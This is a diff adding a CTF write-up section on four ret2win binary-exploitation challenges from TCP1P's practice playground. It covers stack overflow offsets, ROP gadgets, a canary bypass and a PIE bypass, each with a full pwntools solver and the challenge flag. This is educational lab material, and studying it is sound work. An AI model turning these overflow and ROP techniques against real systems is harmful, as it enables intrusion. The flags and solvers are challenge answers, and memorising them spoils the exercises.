@@ -18,6 +18,165 @@ TCP1P is an Indonesian CTF team actively engaging in competitive cybersecurity e
 This event CTF has very long time (1 Year(its not even finish yet)), so i kinda confused to write the right year on the title (lol) (update: nah, ill just name it 365 then), so this CTF has so many categories, and my overall solved is on Forensic, Web Exploitation, Binary Exploitation, Reverse Engineering, and Blockchain.
 
 So maybe i'll post 1 category/day or smth, depends on my mood
+## Binary Exploitation
+### ret2win
+##### Author: zran
+##### Desc: Buffer overflow di stack bisa kita gunakan untuk overwrite saved RIP. Kita bisa overwrite dengan alamat fungsi win untuk menjalankannya.
+so we got a file of binary, and netcat service, the first is i'll find the offset, and i got the offset on 120
+![offset](ret2winoffset.png)
+
+why 120? cus they system got looping on input length 120 char, when we try to input 121 char, the system will get segm vault. after we find the offset, now we find the win address and return address
+![](ret2winwinretaddr.png)
+win address on `0x401216` and ret address on `0x000000000040129d`, and ye this is the solver
+#### Solver
+```py
+from pwn import *
+
+host = "playground.tcp1p.team"
+port = 19000
+
+win_addr = 0x401216
+ret_addr = 0x000000000040129d  
+
+offset = 120
+
+payload = b"A" * offset  
+payload += p64(ret_addr) 
+payload += p64(win_addr) 
+
+io = remote(host, port)
+io.sendline(payload)
+io.interactive()
+```
+![](ret2winflag.png)
+Flag: `TCP1P{bisa_jalanin_fungsi_apapun_kan_jadinya_bang}`
+### ret2win 2
+##### Author: zran
+##### Desc: Introduction to Return Oriented Programming (ROP). Di arsitektur x86-64, 3 argumen pertama dari saat memanggil fungsi diambil dari register RDI, RSI, dan RDX. Dengan tools seperti ropper atau ROPgadget, kita bisa dapetin gadget yang bisa ngisi register-register itu dengan nilai yang kita inginkan.
+i got binary file and netcat address, and also this is still ret2win chall but with adding rop. i got the offset on 120 (same as the previous one) 
+![](ret2win2segsvault.png)
+and now we can find the RDI, RSI, and RDX using ROPgadget
+![](ret2win2ropgadget.png)
+and then we find the address function and diass win function
+![functions](ret2win2infofunctions.png)
+
+
+![disassemblywin](ret2win2disasswin.png)
+as you can see, win function need 3 arguments for gaining true condition,so we can fill it with RDI, RSI, and RDX variable, RDI = `0xdeadbeefdeadbeef`, RSI = `0xabcd1234dcba4321`, and RDX = `0x147147147147147`
+so this is the solver
+#### Solver
+```py
+from pwn import *
+
+host = "playground.tcp1p.team"
+port = 19001
+
+win_addr = 0x401227
+
+pop_rdi = 0x40121e 
+pop_rsi = 0x401220  
+pop_rdx = 0x401222  
+ret_addr = 0x000000000040130c 
+arg1 = 0xdeadbeefdeadbeef
+arg2 = 0xabcd1234dcba4321
+arg3 = 0x147147147147147
+
+offset = 120
+
+payload = b"A" * offset
+payload += p64(pop_rdi) + p64(arg1)
+payload += p64(pop_rsi) + p64(arg2)
+payload += p64(pop_rdx) + p64(arg3)
+payload += p64(ret_addr) 
+payload += p64(win_addr)  
+
+
+io = remote(host, port)
+io.sendline(payload)
+io.interactive()
+```
+![](ret2win2flag.png)
+Flag: `TCP1P{pop_rdi_pop_rsi_pop_rdx_sangat_diincar_heker}`
+
+### ret2win 3
+##### Author: zran
+##### Desc: Salah satu mitigasi dari buffer overflow di stack adalah canary. Canary adalah 8 byte random yang diletakkan sebelum saved RBP. Jadi, kalau kita overwrite saved RIP menggunakan buffer overflow, canary pasti akan ikut berubah. Canary akan diperiksa oleh program setiap sebelum keluar fungsi dan kalau canary-nya berubah dari sebelumnya, berarti telah terjadi buffer overflow dan program akan dihentikan. Tapi, kalau kita tau canary-nya, kita tinggal masukin ke payload kita di offset yang sesuai.
+as always, i got the binary file and the netcat service address, this chall talk about canary, lets check It
+![](ret2win31.png)
+as you can see, the `CANARY` is found, but the weird is the program gives something called `gift`, i think it was canary address, so i think this is easy, cus we can leak all address by this canary address, but first, we need to find the offset
+![](ret2win3offset.png)
+this is different than the previous one, the offset is on 104, cus when i input 105 the system get segsvault, and now we find the win and ret address
+![](ret2win3functions.png)
+![](ret2win3disasswin.png)
+win addr on `0x401236` and ret addr on `0x00000000004012e0`, so this is the solver
+#### Solver
+```py
+from pwn import *
+
+host = "playground.tcp1p.team"
+port = 19002
+
+io = remote(host, port)
+io.recvuntil("Here's a gift for you: ")
+canary = int(io.recvline().strip(), 16) 
+log.info(f"Leaked Canary: {hex(canary)}")
+
+win_addr = 0x401236
+ret_addr = 0x00000000004012e0  
+
+offset = 104
+
+payload = b"A" * offset  
+payload += p64(canary) 
+payload += b"B" * 8 
+payload += p64(ret_addr)
+payload += p64(win_addr)
+
+io.sendlineafter("Give me your payload: ", payload)
+io.interactive()
+```
+![](ret2win3flag.png)
+Flag: `TCP1P{gimana_rasanya_ngebypass_mitigasi_pertama_bang}`
+### ret2win 4
+##### Author: zran
+##### Desc: Mitigasi lain untuk menyusahkan penyerang dalam mengubah alur program adalah PIE. PIE adalah singkatan dari Position Independent Executable yang mengakibatkan program kita untuk di-load ke dalam memori dengan offset random. Jadi walaupun ada buffer overflow, penyerang tidak tau alamat dari fungsi/instruksi yang ingin dijalankan. Tapi, kalau kita bisa dapetin salah satu alamat dari program saat dijalankan, alamat dari fungsi/instruksi yang ingin dijalankan tinggal dihitung dari selisihnya dengan alamat yang udah didapetin tadi.
+so yea this is still ret2win, but with PIE, PIE is annoying ngl, cus every we run the program, the addr is changed, but in this CTF chall, i got leak address when i run the program
+
+![](ret2win4run.png)
+
+so we can calculate it using method in pwn library, `ELF("./ret2win")` to load binary, `elf.sym['win']` to find win address, and `next(elf.search(asm("ret")))` for find ret gadget automatically and using `flat()` to make the payload clean
+and this is the solver looks like
+#### Solver
+```py
+from pwn import *
+
+host = "playground.tcp1p.team"
+port = 19003
+
+elf = context.binary = ELF("./ret2win", checksec=False)
+
+p = remote(host, port)
+
+p.recvuntil(b"Here's a gift for you: ")
+pie_leak = int(p.recvline().strip(), 16)
+log.info(f"Leaked PIE address: {hex(pie_leak)}")
+
+offset_to_leak = 0x404c 
+elf.address = pie_leak - offset_to_leak
+log.info(f"Calculated PIE Base: {hex(elf.address)}")
+win = elf.sym['win']
+ret = next(elf.search(asm("ret")))
+log.info(f"Address of win(): {hex(win)}")
+log.info(f"Address of ret: {hex(ret)}")
+offset = 120  
+payload = flat(
+    cyclic(offset), ret, win
+)
+p.sendlineafter(b": ", payload)
+p.interactive()
+```
+![](ret2win4flag.png)
+Flag: `TCP1P{leak_satu_alamat_semua_alamat_ketahuan}`
 ## Reverse Engineering
 ### Micro Rev
 ###### Author: Dimas Maulana
